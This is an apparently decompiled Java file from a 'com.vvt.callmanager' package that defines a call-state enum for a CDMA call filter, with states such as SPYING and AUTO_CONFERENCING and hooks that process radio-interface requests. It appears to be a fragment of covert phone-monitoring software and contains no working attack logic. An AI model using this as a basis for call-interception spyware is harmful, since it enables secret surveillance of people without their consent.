package com.vvt.callmanager.filter;

import android.os.Parcel;

public enum FilterCdmaCall$CallState
{
  protected FilterCdmaCall mFilterCall;
  
  static
  {
    int i = 4;
    int j = 3;
    int k = 2;
    int m = 1;
    Object localObject = new com/vvt/callmanager/filter/FilterCdmaCall$CallState$1;
    ((FilterCdmaCall.CallState.1)localObject).<init>("IDLE", 0);
    IDLE = (CallState)localObject;
    localObject = new com/vvt/callmanager/filter/FilterCdmaCall$CallState$2;
    ((FilterCdmaCall.CallState.2)localObject).<init>("DIALING_RINGING", m);
    DIALING_RINGING = (CallState)localObject;
    localObject = new com/vvt/callmanager/filter/FilterCdmaCall$CallState$3;
    ((FilterCdmaCall.CallState.3)localObject).<init>("ONE_ACTIVE_CALL", k);
    ONE_ACTIVE_CALL = (CallState)localObject;
    localObject = new com/vvt/callmanager/filter/FilterCdmaCall$CallState$4;
    ((FilterCdmaCall.CallState.4)localObject).<init>("MULTIPLE_CALLS", j);
    MULTIPLE_CALLS = (CallState)localObject;
    localObject = new com/vvt/callmanager/filter/FilterCdmaCall$CallState$5;
    ((FilterCdmaCall.CallState.5)localObject).<init>("SPYING", i);
    SPYING = (CallState)localObject;
    localObject = new com/vvt/callmanager/filter/FilterCdmaCall$CallState$6;
    ((FilterCdmaCall.CallState.6)localObject).<init>("AUTO_CONFERENCING", 5);
    AUTO_CONFERENCING = (CallState)localObject;
    localObject = new CallState[6];
    CallState localCallState1 = IDLE;
    localObject[0] = localCallState1;
    localCallState1 = DIALING_RINGING;
    localObject[m] = localCallState1;
    localCallState1 = ONE_ACTIVE_CALL;
    localObject[k] = localCallState1;
    localCallState1 = MULTIPLE_CALLS;
    localObject[j] = localCallState1;
    localCallState1 = SPYING;
    localObject[i] = localCallState1;
    CallState localCallState2 = AUTO_CONFERENCING;
    localObject[5] = localCallState2;
    a = (CallState[])localObject;
  }
  
  public abstract void onEnter(Object paramObject);
  
  public abstract Object onExit();
  
  public abstract CallState processResponse(Parcel paramParcel);
  
  public abstract CallState processRilRequest(Parcel paramParcel);
  
  void setMessageFilter(FilterCdmaCall paramFilterCdmaCall)
  {
    this.mFilterCall = paramFilterCdmaCall;
  }
}


/* Location:              /Volumes/D1/codebase/android/POC/assets/product/callmgr/classes-enjarify.jar!/com/vvt/callmanager/filter/FilterCdmaCall$CallState.class
 * Java compiler version: 5 (49.0)
 * JD-Core Version:       0.7.1
 */